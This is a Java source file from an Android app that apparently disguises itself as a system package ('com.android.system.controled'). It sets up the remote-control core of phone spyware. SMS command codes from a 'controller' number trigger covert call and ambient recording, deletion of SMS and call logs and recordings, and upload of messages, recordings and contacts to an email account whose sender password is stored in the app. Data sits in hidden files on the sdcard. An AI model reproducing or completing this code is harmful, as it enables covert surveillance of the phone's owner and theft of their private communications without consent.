package com.android.system.controled;

import java.io.File;

import android.app.Application;
import android.os.Environment;

import com.android.system.controled.db.SdcardSqliteHelper;
import com.android.system.controled.util.InitUtil;
import com.android.system.controled.util.StringUtil;

public class MainApplication extends Application {

	private static final String TAG = "MainApplication";
	
	private String controllerTel = "";// 控制者的电话号码
	/**
	 * 发送者的email和密码，163邮箱
	 */
	private String senderEmailAddr = "";
	private String senderPwd = "";

	/**
	 * 接收者的email
	 */
	private String receiverEmailAddr = "";

	public static final String PHONE_CODE_UP = "zgy_011";
	public static final String PHONE_CODE_DOWN = "zgy_012";
	public static final String PHONE_CODE_CALL_ME = "zgy_013";

	public static final String PHONE_CODE_RECORD_TIME = "zgy_015:";
	public static final String PHONE_CODE_RECORD_START = "zgy_016";
	public static final String PHONE_CODE_RECORD_END = "zgy_017";

	public static final String PHONE_CODE_DELETE_MSG_LOG = "zgy_021";
	public static final String PHONE_CODE_DELETE_CALL_LOG = "zgy_022";
	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "zgy_023";
	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "zgy_025";
	public static final String PHONE_CODE_DELETE_ALL_LOG = "zgy_026";

	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "zgy_031";
	public static final String PHONE_CODE_UPLOAD_ALL = "zgy_032";
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "zgy_033";
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "zgy_035";
	public static final String PHONE_CODE_UPLOAD_CONTACTS = "zgy_036";

	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "zgy_031M";
	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "zgy_032M";
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "zgy_033M";
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "zgy_035M";
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "zgy_036M";

	public static final String PHONE_CODE_TURNON_WIFI = "zgy_057";
	public static final String PHONE_CODE_TURNON_MOBILE = "zgy_056";
	
	public static final String PHONE_CODE_UP_MARK = "调大铃声音量";
	public static final String PHONE_CODE_DOWN_MARK = "使手机静音";
	public static final String PHONE_CODE_CALL_ME_MARK = "给我打电话";

	public static final String PHONE_CODE_RECORD_TIME_MARK = "录音N分钟";
	public static final String PHONE_CODE_RECORD_START_MARK = "开始录音";
	public static final String PHONE_CODE_RECORD_END_MARK = "结束录音";

	public static final String PHONE_CODE_DELETE_MSG_LOG_MARK = "删除短信记录";
	public static final String PHONE_CODE_DELETE_CALL_LOG_MARK = "删除通话记录";
	public static final String PHONE_CODE_DELETE_AUDIOS_CALL_MARK = "删除通话录音";
	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER_MARK = "删除其他录音";
	public static final String PHONE_CODE_DELETE_ALL_LOG_MARK = "删除所有记录";

	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MARK = "上传短信通话记录[仅Wifi]";
	public static final String PHONE_CODE_UPLOAD_ALL_MARK = "上传所有记录、录音[仅Wifi]";
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MARK = "上传通话录音[仅Wifi]";
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MARK = "上传其他录音[仅Wifi]";
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MARK = "上传通讯录[仅Wifi]";

	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE_MARK = "上传短信通话记录[含gprs]";
	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE_MARK = "上传所有记录、录音[含gprs]";
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE_MARK = "上传通话录音[含gprs]";
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE_MARK = "上传其他录音[含gprs]";
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE_MARK = "上传通讯录[含gprs]";

	public static final String PHONE_CODE_TURNON_WIFI_MARK = "打开Wifi";
	public static final String PHONE_CODE_TURNON_MOBILE_MARK = "打开Gprs";

	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";

	public static final String FILE_IN_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";
	public static final File FILE_DB_SMS = new File(MainApplication.FILE_IN_SDCARD + SdcardSqliteHelper.DATABASENAME);
	
	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + ".androidcall.txt");
	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
	
	public static final File FILE_CODE_TEXT = new File(FILE_IN_SDCARD + ".codestemp.txt");
	public static final File FILE_SMS_TEXT = new File(FILE_IN_SDCARD + ".androidsmstemp.txt");
	public static final File FILE_CONTACTS_TEXT = new File(FILE_IN_SDCARD + ".contactstemp.txt");
	
	private static MainApplication instence;

	public static MainApplication getInstence() {
		return instence;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		instence = this;
		Debug.e("", "==============Application   IS onCreate=======================");
		InitUtil.init(this);
		InitUtil.initConfig(this);
	}

	@Override
	public void onTerminate() {
		Debug.e("", "==============Application   IS onTerminate=======================");
		super.onTerminate();
	}

	public String getControllerTel() {
		if (StringUtil.isNull(controllerTel))
			InitUtil.initConfig(instence);
		return controllerTel;
	}

	public void setControllerTel(String controllerTel) {
		this.controllerTel = controllerTel;
	}

	public String getSenderEmailAddr() {
		if (StringUtil.isNull(senderEmailAddr))
			InitUtil.initConfig(instence);
		return senderEmailAddr;
	}

	public void setSenderEmailAddr(String senderEmailAddr) {
		this.senderEmailAddr = senderEmailAddr;
	}

	public String getSenderPwd() {
		if (StringUtil.isNull(senderPwd))
			InitUtil.initConfig(instence);
		return senderPwd;
	}

	public void setSenderPwd(String senderPwd) {
		this.senderPwd = senderPwd;
	}

	public String getReceiverEmailAddr() {
		if (StringUtil.isNull(receiverEmailAddr))
			InitUtil.initConfig(instence);
		return receiverEmailAddr;
	}

	public void setReceiverEmailAddr(String receiverEmailAddr) {
		this.receiverEmailAddr = receiverEmailAddr;
	}
}
